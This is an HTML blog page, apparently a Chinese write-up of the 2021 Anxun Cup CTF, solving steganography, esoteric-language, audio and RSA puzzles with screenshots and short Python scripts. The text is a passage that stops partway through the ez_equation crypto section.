@@ -1,0 +1,1066 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>第四届“安洵杯”网络安全挑战赛Writeup | Le1a的菜园坝</title>
+<link rel="shortcut icon" href="https://le1a.github.io/favicon.ico?v=1695699802917">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://le1a.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="第四届“安洵杯”网络安全挑战赛Writeup | Le1a的菜园坝 - Atom Feed" href="https://le1a.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-W25ZHLT37K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W25ZHLT37K');
+</script>
+
+
+    <meta name="description" content="Misc
+应该算是签到
+
+B站搜索直接搜索这个BV号
+
+PS：出题人品味不错，我也喜欢酷玩的这首《Yellow》
+直接页面Ctrl+F没找出来
+搜索引擎找一下有没有通过API查弹幕的方法：https://www.bilibili.com/r..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://le1a.github.io">
+  <img class="avatar" src="https://le1a.github.io/images/avatar.png?v=1695699802917" alt="">
+  </a>
+  <h1 class="site-title">
+    Le1a的菜园坝
+  </h1>
+  <p class="site-description">
+    欢迎来到菜园坝~~~
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends/" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about/" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/Le1a/" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Le1aaaaa" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              第四届“安洵杯”网络安全挑战赛Writeup
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-11-28
+              </span>
+              <span>
+                25 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h2 id="misc">Misc</h2>
+<h3 id="应该算是签到">应该算是签到</h3>
+<p><img src="https://img-blog.csdnimg.cn/9f877f6b38f946d494568bd4d22d2d6d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5pyrIOWInQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"><br>
+B站搜索直接搜索这个BV号<br>
+<img src="https://img-blog.csdnimg.cn/05c2a00a68a74607afec56d1b95bde49.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5pyrIOWInQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"><br>
+PS：出题人品味不错，我也喜欢酷玩的这首《Yellow》</p>
+<p>直接页面<code>Ctrl+F</code>没找出来<br>
+搜索引擎找一下有没有通过API查弹幕的方法：<a href="https://www.bilibili.com/read/cv7923601">https://www.bilibili.com/read/cv7923601</a></p>
+<p><img src="https://img-blog.csdnimg.cn/9ef447b44420404287e69de0f029eb41.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5pyrIOWInQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"><br>
+F12点击<code>Network</code>，找到这个视频的cid<br>
+<img src="https://img-blog.csdnimg.cn/42b604c9faac4041bf76553a71480db3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5pyrIOWInQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"><br>
+从当前时间<code>2021-11-27</code>开始往前找</p>
+<pre><code class="language-html">https://api.bilibili.com/x/v2/dm/web/history/seg.so?type=1&amp;oid=400438565&amp;date=2021-11-27
+</code></pre>
+<p>将历史弹幕文件下载下来，选择<code>UTF-8</code>编码，然后查找关键字即可<br>
+<img src="https://img-blog.csdnimg.cn/f8a4b917a8984690a7fff794af60b1bb.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5pyrIOWInQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></p>
+<pre><code class="language-html">D0g3{We1come_to_axbg0g0g0}
+</code></pre>
+<h3 id="cyzcc_loves_lol">CyzCC_loves_LOL</h3>
+<p><img src="https://img-blog.csdnimg.cn/e96a547f441f474e973872f96b7bff72.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5pyrIOWInQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"><br>
+<code>D0g3_LOLteampassword</code></p>
+<pre><code class="language-html">HAI D0g3 code
+I HAS A CODE ITZ &quot;D0g3isthepAssword&quot;
+I HAS A MSG ITZ &quot;&quot;
+I HAS A COUNTER ITZ 0
+I HAS A NUM
+IM IN YR LOOP UPPIN YR COUNTER WILE COUNTER SMALLR THAN LEN OF CODE
+I HAS A C ITZ CODE!COUNTER
+NUM R ORD OF C
+NUM R SUM OF NUM AN -3
+IZ NUM SMALLR THAN 65?, NUM R SUM OF NUM AN 26, KTHX
+NUM R CHR OF NUM
+MSG R SMOOSH MSG AN NUM
+IM OUTTA YR LOOP
+VISIBLE MSG
+KTHXBYE
+</code></pre>
+<p>看不懂什么东西，猜测某种编码，搜索引擎找一下<br>
+<img src="https://img-blog.csdnimg.cn/94dc8dd5c3414b6f9de410d3e1f7c89b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5pyrIOWInQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></p>
+<ul>
+<li>lolcode-language：<a href="https://www.dcode.fr/lolcode-language">https://www.dcode.fr/lolcode-language</a></li>
+</ul>
+<p>解码得到<code>ez_misc.zip</code>密码：<code>AGdJfpqebmXpptloa</code><br>
+<img src="https://img-blog.csdnimg.cn/20cae9b389844beab40a6eafedc63ca7.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5pyrIOWInQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></p>
+<p><img src="https://img-blog.csdnimg.cn/ab1a1e8c7cb641c6b3bb1350dc89f4c6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5pyrIOWInQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"><br>
+<code>Program.png</code>根据名称提示一开始以为是<code>npiet</code>，尝试直接编译发现不对<br>
+<img src="https://img-blog.csdnimg.cn/bd62be86d21144c48ea086525859d092.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5pyrIOWInQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"><br>
+后来经过查阅资料才发现<code>Brainfuck</code>也有一种用像素颜色表示的语言：<code>Brainloller</code></p>
+<ul>
+<li><a href="https://minond.xyz/brainloller/">https://minond.xyz/brainloller/</a></li>
+</ul>
+<p>上传之后点击<code>Play</code>，得到密码：<code>0MTTW CWZVN!</code><br>
+<img src="https://img-blog.csdnimg.cn/bf7f61b68e164a43923058a8dc52e651.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5pyrIOWInQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"><br>
+然后根据题目名称提示将密码中的空格换成下划线、以及<code>jinx's_flag_in_silent.jpg</code>的名称，直接尝试<code>SilentEye</code>解密<br>
+<img src="https://img-blog.csdnimg.cn/276bd005cbe449c9a8bad3ec33ac2e5f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5pyrIOWInQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></p>
+<pre><code class="language-html">D0g3{544f3225-bbaf-47dc-ba8d-5bda54cbaecb}
+</code></pre>
+<h3 id="cthulhu-mythos">Cthulhu Mythos</h3>
+<p>下载附件，发现是里面是一个<code>hint.mp3</code> 和<code>The Evil Watcher.wld</code></p>
+<figure data-type="image" tabindex="1"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/ed01556b03819.png" alt="1638064889766.png" loading="lazy"></figure>
+<p><code>hint.mp3</code>听一下，发现前面是泰拉瑞亚的主题曲，后面部分很明显是SSTV</p>
+<figure data-type="image" tabindex="2"><img src="https://img-blog.csdnimg.cn/b657cbabeb4443558c3e8aff6fbaf9cd.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5pyrIOWInQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<p>因为格式问题没法直接用<code>QSSTV</code>，<code>RX-SSTV</code>的话又比较麻烦要调整电脑录音设备，就直接用<code>Robot36</code>听吧</p>
+<p>网上随便找个地址：https://apkpure.com/cn/robot36-sstv-image-decoder/xdsopl.robot36</p>
+<figure data-type="image" tabindex="3"><img src="https://img-blog.csdnimg.cn/2abbabf6ddc84749b8b37d9ed96ab11b.jpg?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5pyrIOWInQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/02e30d3ecdb27.png" alt="1638066200197.png" loading="lazy"></figure>
+<p>得到后半部分的flag：<code>d_Try_Terr4ria!}</code></p>
+<p><code>The Evil Watcher.wld</code>文件是Terraria游戏的一个地图文件，我们可以通过<code>Terramap地图查看器</code>去加载这个地图文件</p>
+<p>Terramap链接：https://www.bilibili.com/read/cv8778447/</p>
+<p>等加载完地图，Players:选择All Spoiers，这样地图就全部显现出来了，可以通过左键拖动地图，右键可以查看相关物品信息</p>
+<figure data-type="image" tabindex="5"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/4235e8e1a6b83.png" alt="1638065164008.png" loading="lazy"></figure>
+<p>在地图中发现了四个蓝色突起状的东西，右键点击发现了类似base编码的东西</p>
+<figure data-type="image" tabindex="6"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/a7af413b9a80b.png" alt="1638065561205.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/3c1a31d7f6d4f.png" alt="1638064689315.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/d2827e9300c6b.png" alt="1638065626983.png" loading="lazy"></figure>
+<p>第四个箱子说密文被机械师拿走了</p>
+<figure data-type="image" tabindex="9"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/18befb5b78aae.png" alt="1638065706429.png" loading="lazy"></figure>
+<p>讲前三个箱子的base编码组合一下，得到base32编码</p>
+<pre><code>IQYGOM33JUYW4ZLDKI2GM5C
+</code></pre>
+<p>用<code> CyberChef</code>解码一下得到前半部分的<code>D0g3{M1necR4ft</code>，但是跟后半部分是连不上的，我们再去看看第四个箱子里面被拿走的密文是什么</p>
+<figure data-type="image" tabindex="10"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/c459c050cd3e1.png" alt="1638065902348.png" loading="lazy"></figure>
+<p>最后一个箱子的密文始终没有找到，在尝试了多个编辑器后，终于使用<code>Tedit</code>在出生地发现了最后的密文，不知道为啥有的编辑器不显示，有的编辑器又会显示。。。</p>
+<p>Tedit下载地址：https://www.binaryconstruct.com/downloads/</p>
+<figure data-type="image" tabindex="11"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/696e3d41c127f.png" alt="1638066532923.png" loading="lazy"></figure>
+<p>得到<code>7I4YF6QLO</code>，所以完整的前半部分的base32编码就是<code>IQYGOM33JUYW4ZLDKI2GM5C7I4YF6QLO</code></p>
+<figure data-type="image" tabindex="12"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/b88db6e619ad9.png" alt="1638066719523.png" loading="lazy"></figure>
+<p>得到<code>D0g3{M1necR4ft_G0_An</code>，所以结合前面的后半部分flag：<code>d_Try_Terr4ria!}</code></p>
+<p>所以flag为：</p>
+<pre><code>D0g3{M1necR4ft_G0_And_Try_Terr4ria!}
+</code></pre>
+<h3 id="lovemath">lovemath</h3>
+<p>打开压缩包，里面除了flag.zip，还有几个 大小只有6的txt文件，这里应该是要crc32爆破了</p>
+<figure data-type="image" tabindex="13"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/27/c16cc75a883b6.png" alt="1638020484086.png" loading="lazy"></figure>
+<p>使用命令：</p>
+<pre><code>python crc32.py reverse 0xCRC32的值
+</code></pre>
+<p>分别得到：</p>
+<figure data-type="image" tabindex="14"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/27/4a1a49ee96073.png" alt="1638020857885.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="15"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/27/4c9b76ffb68c3.png" alt="1638020906039.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="16"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/27/6b520f1212d18.png" alt="1638020956484.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="17"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/27/7360afd785f95.png" alt="1638021008620.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="18"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/27/002ace4f5dcb2.png" alt="1638021073161.png" loading="lazy"></figure>
+<p>连起来就是：<code>th1s_Is_Y0ur_pa33w0rd_We1c0m3e</code></p>
+<p>打开flag.zip得到</p>
+<figure data-type="image" tabindex="19"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/27/aa6817873fd30.png" alt="1638021141040.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="20"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/27/0e71945f29951.png" alt="1638021206995.png" loading="lazy"></figure>
+<p>用Stegsolve打开图片，发现R,G,B的0通道都有异常</p>
+<figure data-type="image" tabindex="21"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/27/2ff1984ed0fed.png" alt="1638021293911.png" loading="lazy"></figure>
+<p>应该是LSB隐写没跑了</p>
+<figure data-type="image" tabindex="22"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/27/911adaf4c919d.png" alt="1638021343913.png" loading="lazy"></figure>
+<p>我们将其Save Bin，保存为png图片，发现打不开，用010打开发现文件头前面有多余的字节，删掉后可打开得到一张带有很多数字的图片</p>
+<figure data-type="image" tabindex="23"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/27/d49d0a524e09d.png" alt="1638021438762.png" loading="lazy"></figure>
+<p>因为没法复制，手撸的话估计眼睛要瞎了，尝试用QQ识图来获取数据，但是全部选中识别又有误差，于是选了个折中的办法就是半行半行的用QQ识图。。。总算是识别完了，遭不住，眼睛痛</p>
+<pre><code>1251077695482776025338577125579215707216262981842821000162276994967943212822693842845266851984880336702446444408289977864567921038435144120176357529686342977212633764247620567669441602729004003473312468776582473461071462631554533766709934484393185739708817165738912742570170547790145328253304755428563911689057632001795598667127514331122190795355921436735375126688142856470280128821316586008242687241930886868804388482643589009068543771977163419519208340324352
+</code></pre>
+<p>尝试过转字符，但是失败了哈哈哈哈，果然作为500分的题肯定没这么简单，根据题目，<code>lovemath</code>和<code>数学如此美丽，甚至能画出自己</code>来看，这题应该是要通过某种数学方式来绘图，并且注意这句<code>甚至能画出自己</code>，最后百度了很久，终于在百度<code>自我画图公式</code>的结果中，发现了<code>塔伯自我指涉公式作图程序(matplotlib)</code>，里面还附有脚本</p>
+<p>脚本地址：https://www.cnblogs.com/1024th/p/14418846.html</p>
+<figure data-type="image" tabindex="24"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/27/87c1ded774350.png" alt="1638022624948.png" loading="lazy"></figure>
+<p>脚本如下:</p>
+<pre><code class="language-python">&quot;&quot;&quot;
+Plot Tupper's self-referential formula
+&quot;&quot;&quot;
+import textwrap
+import matplotlib.pyplot as plt
+
+K = 1251077695482776025338577125579215707216262981842821000162276994967943212822693842845266851984880336702446444408289977864567921038435144120176357529686342977212633764247620567669441602729004003473312468776582473461071462631554533766709934484393185739708817165738912742570170547790145328253304755428563911689057632001795598667127514331122190795355921436735375126688142856470280128821316586008242687241930886868804388482643589009068543771977163419519208340324352
+
+
+H = 17
+W = 106
+
+if __name__ == &quot;__main__&quot;:
+    plt.figure(figsize=(6.8, 4), dpi=600)
+    plt.axis(&quot;scaled&quot;)
+
+    K_ = K//17
+    for x in range(W):
+        for y in range(H):
+            if K_ &amp; 1:
+                plt.bar(x+0.5, bottom=y, height=1,
+                        width=1, linewidth=0, color=&quot;black&quot;)
+            K_ &gt;&gt;= 1
+
+    plt.figtext(0.5, 0.8, r&quot;$\frac{1}{2}&lt;\left\lfloor \operatorname{mod}\left(\left\lfloor\frac{y}{%d}\right\rfloor 2^{-%d\lfloor x\rfloor-\operatorname{mod}(\lfloor y\rfloor, %d)}, 2\right)\right\rfloor$&quot; % (H, H, H), ha=&quot;center&quot;, va=&quot;bottom&quot;, fontsize=18)
+    plt.subplots_adjust(top=0.8, bottom=0.5)
+    K_str = textwrap.wrap(str(K), 68)
+    K_str[0] = f&quot;K={K_str[0]}&quot;
+    for i in range(1, len(K_str)):
+        K_str[i] = f&quot;  {K_str[i]}&quot;.ljust(70)
+    K_str = &quot;\n&quot;.join(K_str)
+    plt.figtext(0.5, 0.45, K_str, fontfamily=&quot;monospace&quot;, ha=&quot;center&quot;, va=&quot;top&quot;)
+
+    plt.xlim((0, W))
+    plt.ylim((0, H))
+    xticks = list(range(0, W+1))
+    xlabels = [&quot;&quot; for i in xticks]
+    xlabels[0] = &quot;0&quot;
+    xlabels[-1] = str(W)
+    plt.xticks(xticks, xlabels)
+    yticks = list(range(0, H+1))
+    ylabels = [&quot;&quot; for i in yticks]
+    ylabels[0] = &quot;K&quot;
+    ylabels[-1] = f&quot;K+{H}&quot;
+    plt.yticks(yticks, ylabels)
+    plt.grid(b=True, linewidth=0.5)
+
+    # plt.show()
+    plt.savefig(&quot;Tupper-plot.png&quot;)
+    # plt.savefig(fname=&quot;name&quot;, format=&quot;svg&quot;)
+</code></pre>
+<p>把之前得到的数据填入<code>K</code>之后运行，得到<code>Tupper-plot.png</code></p>
+<figure data-type="image" tabindex="25"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/27/c3e5e31b74268.png" alt="1638022822602.png" loading="lazy"></figure>
+<p>得到flag为：</p>
+<pre><code>D0g3{I_Lov3_math}
+</code></pre>
+<h2 id="cry">Cry</h2>
+<h3 id="little_trick">little_trick</h3>
+<p>注意到e的生成：</p>
+<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>e</mi><mo>=</mo><mi>g</mi><mi>m</mi><mi>p</mi><mi>y</mi><mn>2.</mn><mi>n</mi><mi>e</mi><mi>x</mi><mi>t</mi><mo>−</mo><mi>p</mi><mi>r</mi><mi>i</mi><mi>m</mi><mi>e</mi><mo>(</mo><mi>b</mi><mi>y</mi><mi>t</mi><mi>e</mi><mi>s</mi><mo>−</mo><mi>t</mi><mi>o</mi><mo>−</mo><mi>l</mi><mi>o</mi><mi>n</mi><mi>g</mi><mo>(</mo><mi>o</mi><mi>s</mi><mi mathvariant="normal">.</mi><mi>u</mi><mi>r</mi><mi>a</mi><mi>n</mi><mi>d</mi><mi>o</mi><mi>m</mi><mo>(</mo><mn>3</mn><mo>)</mo><mo>)</mo><mo>)</mo></mrow><annotation encoding="application/x-tex">e = gmpy2.next-prime(bytes-to-long(os.urandom(3)))
+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">m</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord">2</span><span class="mord">.</span><span class="mord mathdefault">n</span><span class="mord mathdefault">e</span><span class="mord mathdefault">x</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">i</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mopen">(</span><span class="mord mathdefault">b</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69841em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault">o</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord">.</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mord mathdefault">d</span><span class="mord mathdefault">o</span><span class="mord mathdefault">m</span><span class="mopen">(</span><span class="mord">3</span><span class="mclose">)</span><span class="mclose">)</span><span class="mclose">)</span></span></span></span></span></p>
+<p>由此可知e的取值较小，可以爆破出来，大致估计e的范围：e&lt;256 * 256 * 150+256 * 150 +150=9868950，于是设置e的上界为e&lt;10000000.</p>
+<p>直接爆破e时间可能太久，我们采取空间换时间的方法：先把这个范围内的素数全求出来，存在一个列表里面，然后对列表索引爆破，判断依据为b'D0g3'。</p>
+<p>exp</p>
+<pre><code class="language-python">import sympy
+from gmpy2 import *
+from Crypto.Util.number import *
+p=119494148343917708105807117614773529196380452025859574123211538859983094108015678321724495609785332508563534950957367289723559468197440246960403054020452985281797756117166991826626612422135797192886041925043855329391156291955066822268279533978514896151007690729926904044407542983781817530576308669792533266431
+q=125132685086281666800573404868585424815247082213724647473226016452471461555742194042617318063670311290694310562746442372293133509175379170933514423842462487594186286854028887049828613566072663640036114898823281310177406827049478153958964127866484011400391821374773362883518683538899757137598483532099590137741
+c=10238271315477488225331712641083290024488811710093033734535910573493409567056934528110845049143193836706122210303055466145819256893293429223389828252657426030118534127684265261192503406287408932832340938343447997791634435068366383965928991637536875223511277583685579314781547648602666391656306703321971680803977982711407979248979910513665732355859523500729534069909408292024381225192240385351325999798206366949106362537376452662264512012770586451783712626665065161704126536742755054830427864982782030834837388544811172279496657776884209756069056812750476669508640817369423238496930357725842768918791347095504283368032
+e=2
+phi=(p-1)*(q-1)
+n=p*q
+l=[2]
+while e&lt;10000000:
+    e=sympy.nextprime(e)
+    l.append(e)
+for e in l:
+    if gcd(e,phi)!=1:
+        continue
+    d=invert(e,phi)
+    m=long_to_bytes(pow(c,d,n))
+    if b'D0g3' in m:
+        print(m)
+        break
+
+
+</code></pre>
+<p>运行大概十几二十分钟可得结果。</p>
+<p>flag为:</p>
+<pre><code>D0g3{Welc0me_t0_iSOON_4nd_have_4_go0d_time}
+</code></pre>
+<h3 id="ez_equation">ez_equation</h3>
+<p>设primelist中的三个素数分别为p1,p2,p3，则有M1=y1+x2+x3=<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>p</mi><mn>2</mn></msub><mo>(</mo><msub><mi>p</mi><mn>1</mn></msub><mo>+</mo><mn>1</mn><mo>)</mo><mo>(</mo><msub><mi>p</mi><mn>1</mn></msub><mo>+</mo><msub><mi>p</mi><mn>2</mn></msub><mo>)</mo></mrow><annotation encoding="application/x-tex">p_2(p_1+1)(p_1+p_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，M2=y2+y3=<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>p</mi><mn>2</mn></msub><mo>(</mo><msub><mi>p</mi><mn>3</mn></msub><mo>+</mo><mn>1</mn><mo>)</mo><mo>(</mo><msub><mi>p</mi><mn>1</mn></msub><mo>+</mo><msub><mi>p</mi><mn>2</mn></msub><mo>)</mo><mo>−</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">p_2(p_3+1)(p_1+p_2)-2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" 